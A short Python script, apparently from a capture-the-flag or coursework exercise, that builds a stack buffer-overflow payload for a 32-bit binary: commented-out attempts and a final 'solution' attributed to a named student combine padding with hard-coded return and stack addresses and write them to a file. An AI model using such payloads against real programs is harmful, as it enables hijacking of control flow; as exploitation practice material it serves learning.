#data = b"A"*0x30 + b"B"*0x4 + b"\x96\x91\x04\x08"
#data = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"+b"OPQR"+b"STUV" + b"B"*0x4 + b"\x96\x91\x04\x08"
#data = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"+b"\x9A\x91\x04\x08"+b"STUV" + b"B"*0x4 + b"\x96\x91\x04\x08"

'''유영준 솔루션'''
data = b"\x96\x91\x04\x08"+b"AAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA"+b"\x3C\xd2\xff\xff"

with open('data', 'wb') as f:
    f.write(data)


